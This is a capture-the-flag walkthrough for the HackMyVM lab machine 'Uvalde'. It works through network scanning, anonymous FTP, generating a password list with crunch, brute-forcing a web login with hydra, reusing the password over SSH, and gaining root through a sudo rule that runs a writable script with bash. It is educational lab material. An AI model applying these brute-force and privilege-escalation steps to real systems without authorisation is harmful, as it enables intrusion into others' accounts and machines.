# Uvalde Writeup HackMyVM

![Uvalde](https://github.com/0xsynix/Writeups/blob/main/assets/HackMyVM/Uvalde/uvalde.png)

<strong>In this walkthrough, I demonstrate how I obtained complete ownership of Uvalde from HackMyVM, A beginner friendly Linux Machine </strong>
<br>
<br>

## Enumeration :
#### >> Find the IP address of our Target in our virtual network, with `netdiscover`

```shell
┌──(synix㉿zer0day)-[~]
└─$ sudo netdiscover -r 192.168.128.1
Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                        
                                                                                                                                                                      
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 144                                                                                                      
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.128.66  1e:de:d2:1f:12:a7      2      84  Unknown vendor                                                                                                     
 192.168.128.70  08:00:27:79:bd:e1      1      60  PCS Systemtechnik GmbH
```
- Our target ip is `192.168.128.70`
  

#### >> Scan for open Ports and services with nmap
```shell
┌──(synix㉿zer0day)-[~]
└─$ sudo nmap -sC -sV 192.168.128.70 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 13:53 IST
Nmap scan report for 192.168.128.70
Host is up (0.00028s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.128.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a:09:a4:da:d7:db:99:ee:a5:51:05:e9:af:e7:08:90 (RSA)
|   256 cb:42:6a:be:22:13:2c:f2:57:f9:80:d1:f7:fb:88:5c (ECDSA)
|_  256 44:3c:b4:0f:aa:c3:94:fa:23:15:19:e3:e5:18:56:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Agency - Start Bootstrap Theme
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:79:BD:E1 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.92 seconds
```

- 21/tcp open ftp vsFTPd 3.0.3
- 22/tcp open ssh
- 80/tcp open http

#### >> Check `ftp` connection with anonymous
```shell
┌──(synix㉿zer0day)-[~]
└─$ ftp 192.168.128.70
Connected to 192.168.128.70.
220 (vsFTPd 3.0.3)
Name (192.168.128.70:synix): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||46798|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        116          4096 Jan 28  2023 .
drwxr-xr-x    2 0        116          4096 Jan 28  2023 ..
-rw-r--r--    1 1000     1000         5154 Jan 28  2023 output
226 Directory send OK.
ftp> get output
local: output remote: output
229 Entering Extended Passive Mode (|||38989|)
150 Opening BINARY mode data connection for output (5154 bytes).
100% |**************************************************************************************************************************|  5154       20.31 MiB/s    00:00 ETA
226 Transfer complete.
5154 bytes received in 00:00 (5.00 MiB/s)
ftp>
```
```shell
┌──(synix㉿zer0day)-[~]
└─$ cat output    
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu
                                                                                
 ▄▄                            ▄▄                                               
 ██                            ██                                               
 ██▄████▄   ▄█████▄   ▄█████▄  ██ ▄██▀   ████▄██▄  ▀██  ███  ██▄  ▄██  ████▄██▄ 
 ██▀   ██   ▀ ▄▄▄██  ██▀    ▀  ██▄██     ██ ██ ██   ██▄ ██    ██  ██   ██ ██ ██ 
 ██    ██  ▄██▀▀▀██  ██        ██▀██▄    ██ ██ ██    ████▀    ▀█▄▄█▀   ██ ██ ██ 
 ██    ██  ██▄▄▄███  ▀██▄▄▄▄█  ██  ▀█▄   ██ ██ ██     ███      ████    ██ ██ ██ 
 ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀  ▀▀ ▀▀ ▀▀     ██        ▀▀     ▀▀ ▀▀ ▀▀ 
                                                    ███                         
                                                                                
                                                                                
                                                                                
                                                                                
            ▄████▄   ██    ██                                                   
           ██▄▄▄▄██  ██    ██                                                   
           ██▀▀▀▀▀▀  ██    ██                                                   
    ██     ▀██▄▄▄▄█  ██▄▄▄███                                                   
    ▀▀       ▀▀▀▀▀    ▀▀▀▀ ▀▀                                                   
                                                                                
                                                                                
matthew@debian:~$ exit
exit

Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE="0"]
```
- Here we have User `matthew` looks intresting


#### >> Brute Force files and subdirectories with `gobuster`

```shell
┌──(synix㉿zer0day)-[~]
└─$ gobuster dir -u http://192.168.128.70 -w /usr/share/wordlists/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.128.70
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 29604]
/user.php             (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 1022]
/create_account.php   (Status: 200) [Size: 1003]
Progress: 5163 / 5164 (99.98%)
===============================================================
Finished
===============================================================
```
- here we have two intresting pages `/login.php` & `/create_account.php`

- By creating account on `/create_account.php` we will get the response which stores the some base64

```shell
┌──(synix㉿zer0day)-[~]
└─$ echo "dXNlcm5hbWU9aGF4JnBhc3N3b3JkPWhheDIwMjRAMTM0Nw==" | base64 -d
username=hax&password=hax2024@1347
```

- The username and password stored in this pattern, username=xxxx&password=xxxx2024@four-digit random number
- So, assume that user `matthew` generated password the same way, so use crunch to generate list with same format. 


#### >> Generate a dictionary list with `crunch`

```shell
┌──(synix㉿zer0day)-[~]
└─$ crunch 16 16 -t matthew2023@%%%% -l aaaaaaaaaaa@aaaa > matth.list      
Crunch will now generate the following amount of data: 170000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000 

┌──(synix㉿zer0day)-[~]
└─$ head matth.list                                                                                                                                   
matthew2023@0000
matthew2023@0001
matthew2023@0002
matthew2023@0003
matthew2023@0004
matthew2023@0005
matthew2023@0006
matthew2023@0007
matthew2023@0008
matthew2023@0009
```
<br>

## Exploitation

#### >> Use `hydra` to crack passowrd of `/login.php`

```shell
┌──(synix㉿zer0day)-[~]
└─$ hydra -v -l matthew -P matth.list 192.168.128.70  http-post-form '/login.php:username=matthew&password=^PASS^:<input type="submit" value="Login">'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-31 16:33:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-post-form://192.168.128.70:80/login.php:username=matthew&password=^PASS^:<input type="submit" value="Login">
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http[s]://192.168.128.70:80/user.php
[80][http-post-form] host: 192.168.128.70   login: matthew   password: matthew2023@1554
[STATUS] attack finished for 192.168.128.70 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-31 16:33:23
```

#### >> Tried login via ssh in case matthew has reused password.

```shell
┌──(synix㉿zer0day)-[~]
└─$ ssh matthew@192.168.128.70                
matthew@192.168.128.70's password: 
Linux uvalde.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 31 08:05:38 2024 from 192.168.128.14
matthew@uvalde:~$ ls -la
total 32
drwxr-xr-x 4 matthew matthew 4096 Jan 31  2023 .
drwxr-xr-x 3 root    root    4096 Jan 31  2023 ..
lrwxrwxrwx 1 root    root       9 Jan 31  2023 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 Jan 31  2023 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 Jan 31  2023 .bashrc
drwx------ 2 matthew matthew 4096 Feb  3  2023 .config
drwxr-xr-x 3 matthew matthew 4096 Jan 31  2023 .local
-rw-r--r-- 1 matthew matthew  807 Jan 31  2023 .profile
-rwx------ 1 matthew matthew   33 Jan 31  2023 user.txt
matthew@uvalde:~$
```

- Well, We got the shell and our user flag!!
<br>


## Privilege Escalation

- Matthew has sudo permission to run /opt/superhack as any user.


```shell
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
matthew@uvalde:~$ cat /opt/superhack
```

- By inspecting the script appears to be simple fake hacking tool.
- Which just prints a string with progess bar and a message claiming that the target has been "PWNED"
- This code itself is not offensive, but because it is executed by /bin/bash, it means that we can forge a file with the same name, execute the content written in the file, and then execute to obtain permissions.


```shell
matthew@uvalde:/opt$ mv superhack abc
matthew@uvalde:/opt$ ls
abc
matthew@uvalde:/opt$ echo "bash" > superhack
matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack
root@uvalde:/opt#


root@uvalde:/opt# cd /root
root@uvalde:~# ls
root.txt
```

- We have both the flags!
